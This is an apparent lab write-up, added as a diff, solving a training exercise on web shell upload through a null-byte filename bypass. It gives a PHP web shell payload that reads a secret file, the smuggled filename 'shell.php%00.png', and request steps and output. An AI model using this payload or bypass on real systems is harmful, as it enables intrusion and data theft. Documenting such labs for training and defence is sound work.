@@ -1,0 +1,50 @@
+================================
+LAB: Web shell upload via obfuscated file extension
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-23
+Lab URL: https://0ab3006103479a508490695b00e700aa.web-security-academy.net
+Category: File Upload Vulnerabilities
+Level: Practitioner
+Objective: Upload a PHP web shell bypassing extension blacklist via null byte obfuscation. Exfiltrate /home/carlos/secret.
+Description: Upload function blacklists .php but fails to handle null byte injection in filenames.
+
+[RECONNAISSANCE]
+----------------
+- Logged in as wiener:peter, navigated to /my-account
+- Avatar upload form: POST /my-account/avatar (multipart/form-data)
+- Uploaded legitimate PNG -> accepted, stored at /files/avatars/dreamhouse-logo.png
+- Server: Apache/2.4.41 (Ubuntu)
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- Direct .php upload blocked by blacklist
+- Blacklist checks raw filename string but does not handle null bytes
+- Filename shell.php%00.png: validation sees .png (pass), Apache/PHP resolves up to null byte -> saves as shell.php
+
+[EXPLOITATION]
+--------------
+Payload: <?php echo file_get_contents('/home/carlos/secret'); ?>
+
+Steps:
+1. Intercept upload request in Burp
+2. Set filename field to: shell.php%00.png
+3. Set Content-Type: image/png
+4. Send -> response: The file avatars/shell.php has been uploaded.
+5. GET /files/avatars/shell.php -> PHP executes, outputs secret
+
+[EVIDENCE]
+----------
+Upload confirmation: The file avatars/shell.php has been uploaded.
+Execution response: ctaBBxPzCjuS3tnJLDxvBn8Mo3ilzy7J
+Lab status: Solved
+
+[LESSONS LEARNED]
+-----------------
+- Blacklists are weak; they must handle encoding tricks like null bytes
+- Null byte (%00) terminates C-string parsing: PHP/Apache truncate filename at null char
+- Whitelisting safe extensions server-side (resolved name) prevents this entirely
+- Always validate the final resolved filename, not the raw user-supplied string
+- Content-Type is trivially spoofed; never rely on it for security decisions
